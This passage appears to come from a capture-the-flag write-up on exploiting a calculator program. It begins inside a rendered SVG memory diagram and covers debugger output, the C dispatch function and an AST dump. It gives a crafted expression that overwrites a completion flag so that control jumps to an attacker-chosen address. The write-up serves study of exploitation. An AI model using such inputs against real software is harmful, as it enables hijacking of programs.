style="font-size:1em">1</text><text text-anchor="middle" x="568" y="548" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="568" y="596" fill="currentcolor" style="font-size:1em">×</text><text text-anchor="middle" x="568" y="644" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="568" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="568" y="708" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="576" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="576" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="576" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="576" y="308" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="576" y="356" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="576" y="404" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="576" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="576" y="548" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="576" y="644" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="576" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="584" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="584" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="584" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="584" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="584" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="584" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="584" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="584" y="596" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="584" y="644" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="584" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="584" y="708" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="592" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="592" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="592" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="592" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="592" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="592" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="592" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="592" y="548" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="592" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="592" y="708" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="600" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="600" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="600" y="548" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="600" y="596" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="600" y="644" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="600" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="600" y="708" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="608" y="132" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="608" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="608" y="644" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="608" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="608" y="708" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="616" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="616" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="616" y="548" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="616" y="596" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="616" y="644" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="616" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="624" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="624" y="164" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="624" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="624" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="624" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="624" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="624" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="624" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="624" y="548" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="624" y="644" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="624" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="624" y="708" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="632" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="632" y="164" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="632" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="632" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="632" y="308" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="632" y="356" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="632" y="404" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="632" y="500" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="632" y="548" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="632" y="644" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="632" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="632" y="708" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="640" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="640" y="164" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="640" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="640" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="640" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="640" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="640" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="640" y="500" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="640" y="548" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="640" y="644" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="640" y="692" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="648" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="648" y="164" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="648" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="648" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="648" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="648" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="648" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="648" y="500" fill="currentcolor" style="font-size:1em">+</text><text text-anchor="middle" x="648" y="548" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="648" y="644" fill="currentcolor" style="font-size:1em">5</text><text text-anchor="middle" x="648" y="692" fill="currentcolor" style="font-size:1em">+</text><text text-anchor="middle" x="648" y="708" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="656" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="656" y="164" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="656" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="656" y="548" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="656" y="644" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="656" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="656" y="708" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="664" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="664" y="164" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="664" y="500" fill="currentcolor" style="font-size:1em">-</text><text text-anchor="middle" x="664" y="548" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="664" y="644" fill="currentcolor" style="font-size:1em">7</text><text text-anchor="middle" x="664" y="692" fill="currentcolor" style="font-size:1em">-</text><text text-anchor="middle" x="664" y="708" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="672" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="672" y="164" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="672" y="500" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="672" y="548" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="672" y="644" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="672" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="672" y="708" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="680" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="680" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="680" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="680" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="680" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="680" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="680" y="500" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="680" y="548" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="680" y="644" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="680" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="688" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="688" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="688" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="688" y="308" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="688" y="356" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="688" y="404" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="688" y="548" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="688" y="644" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="688" y="692" fill="currentcolor" style="font-size:1em">+</text><text text-anchor="middle" x="688" y="708" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="696" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="696" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="696" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="696" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="696" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="696" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="696" y="548" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="696" y="644" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="696" y="692" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="696" y="708" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="704" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="704" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="704" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="704" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="704" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="704" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="704" y="548" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="704" y="644" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="704" y="692" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="704" y="708" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="712" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="712" y="548" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="712" y="644" fill="currentcolor" style="font-size:1em">5</text><text text-anchor="middle" x="712" y="692" fill="currentcolor" style="font-size:1em">*</text><text text-anchor="middle" x="712" y="708" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="720" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="720" y="644" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="720" y="692" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="720" y="708" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="728" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="728" y="548" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="728" y="644" fill="currentcolor" style="font-size:1em">7</text><text text-anchor="middle" x="728" y="692" fill="currentcolor" style="font-size:1em">*</text><text text-anchor="middle" x="736" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="736" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="736" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="736" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="736" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="736" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="736" y="548" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="736" y="644" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="736" y="692" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="744" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="744" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="744" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="744" y="308" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="744" y="356" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="744" y="404" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="744" y="692" fill="currentcolor" style="font-size:1em">+</text><text text-anchor="middle" x="752" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="752" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="752" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="752" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="752" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="752" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="752" y="548" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="752" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="760" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="760" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="760" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="760" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="760" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="760" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="760" y="548" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="760" y="692" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="768" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="768" y="548" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="768" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="776" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="776" y="548" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="776" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="784" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="784" y="692" fill="currentcolor" style="font-size:1em">7</text><text text-anchor="middle" x="792" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="792" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="792" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="792" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="792" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="792" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="792" y="692" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="800" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="800" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="800" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="800" y="308" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="800" y="356" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="800" y="404" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="800" y="692" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="808" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="808" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="808" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="808" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="808" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="808" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="808" y="692" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="816" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="816" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="816" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="816" y="308" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="816" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="816" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="816" y="692" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="824" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="824" y="692" fill="currentcolor" style="font-size:1em">5</text><text text-anchor="middle" x="832" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="840" y="692" fill="currentcolor" style="font-size:1em">7</text><text text-anchor="middle" x="848" y="212" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="848" y="260" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="848" y="308" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="848" y="356" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="848" y="404" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="848" y="692" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="856" y="212" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="856" y="260" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="856" y="308" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="856" y="356" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="856" y="404" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="856" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="864" y="212" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="864" y="260" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="864" y="308" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="864" y="356" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="864" y="404" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="864" y="692" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="872" y="212" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="872" y="260" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="872" y="308" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="872" y="356" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="872" y="404" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="872" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="880" y="212" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="880" y="260" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="880" y="308" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="880" y="356" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="880" y="404" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="880" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="888" y="212" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="888" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="888" y="308" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="888" y="356" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="888" y="404" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="888" y="692" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="896" y="212" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="896" y="260" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="896" y="308" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="896" y="356" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="896" y="404" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="896" y="692" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="904" y="212" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="904" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="904" y="308" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="904" y="356" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="904" y="404" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="904" y="692" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="912" y="212" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="912" y="260" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="912" y="308" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="912" y="356" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="912" y="404" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="920" y="212" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="920" y="260" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="920" y="308" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="920" y="356" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="920" y="404" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="928" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="928" y="260" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="928" y="308" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="928" y="356" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="928" y="404" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="936" y="212" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="936" y="260" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="936" y="308" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="936" y="356" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="936" y="404" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="944" y="308" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="944" y="356" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="944" y="404" fill="currentcolor" style="font-size:1em">]</text></g></svg></div><p>We can verify the bypass succeeded with a debugger:</p><pre tabindex=0><code>Program received signal SIGSEGV, Segmentation fault.
0x1234567812345678 in ?? ()
</code></pre><p>One of the subtleties to consider here was to ensure that <code>completed[16]</code> is overwritten before it is read. The event order is indeed not that trivial and is determined by the <code>dispatch</code> function:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>error_kind <span style=color:#a6e22e>dispatch</span> (<span style=color:#66d9ef>node_t</span><span style=color:#f92672>*</span> node, <span style=color:#66d9ef>int64_t</span> results[], <span style=color:#66d9ef>bool</span> completed[]) {
</span></span><span style=display:flex><span>  IN_SHADOW
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  error_kind err;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>get_completion</span>(node, completed)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ERROR_NO_ERROR;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>node_t</span> <span style=color:#f92672>*</span>node_l <span style=color:#f92672>=</span> node<span style=color:#f92672>-&gt;</span>content.binop.node_l;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>get_completion</span>(node_l, completed)) {
</span></span><span style=display:flex><span>    err <span style=color:#f92672>=</span> <span style=color:#a6e22e>dispatch</span>(node_l, results, completed);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (err <span style=color:#f92672>!=</span> ERROR_NO_ERROR) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> err;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>node_t</span> <span style=color:#f92672>*</span>node_r <span style=color:#f92672>=</span> node<span style=color:#f92672>-&gt;</span>content.binop.node_r;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>get_completion</span>(node_r, completed)) {
</span></span><span style=display:flex><span>    err <span style=color:#f92672>=</span> <span style=color:#a6e22e>dispatch</span>(node_r, results, completed);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (err <span style=color:#f92672>!=</span> ERROR_NO_ERROR) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> err;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// [...] The node calculation is handled here
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>This function follows this scheme:</p><ol><li>The value in <code>completed</code> for the parent node is verified. If it is not zero, both the node and its children will not be computed.</li><li>The value in <code>completed</code> for the left child node is verified, then the node is computed accordingly.</li><li>The value in <code>completed</code> for the right child node is verified, then the node is computed accordingly.</li><li>The parent node is computed.</li></ol><p>We want <code>results[0]</code> (and therefore <code>completed[16]</code>) to be computed before the check for <code>completed[16]</code> is done. Referring to the scheme we just detailed, it is possible to achieve this if there is an ancestor for which node 0 is in the left child descendants, and for which node 16 is in the right child descendants.</p><p>We can verify that the submitted calculation had the desired behavior by dumping the AST.</p><pre tabindex=0><code>calculator -d
&gt;&gt;&gt; (1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(0+1-1)+(0*0*0+1311768465173141112)

| kind = NODE_PLUS
| id = 19
| 
| left:
| 
|  | kind = NODE_TIMES
|  | id = 15
|  | 
|  | left:
|  | 
|  |  | kind = NODE_NUMBER
|  |  | value = 1
|  | 
|  | right:
|  | 
|  |  | kind = NODE_TIMES
|  |  | id = 14
|  |  | 
|  |  | left:
|  |  | 
|  |  |  | kind = NODE_NUMBER
|  |  |  | value = 1
|  |  | 
|  |  | right:
|  |  | 
|  |  |  | kind = NODE_TIMES
|  |  |  | id = 13
|  |  |  | 

[...] The pattern repeats

|  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  | right:
|  |  |  |  |  |  |  |  |  |  |  |  |  | 
|  |  |  |  |  |  |  |  |  |  |  |  |  |  | kind = NODE_TIMES
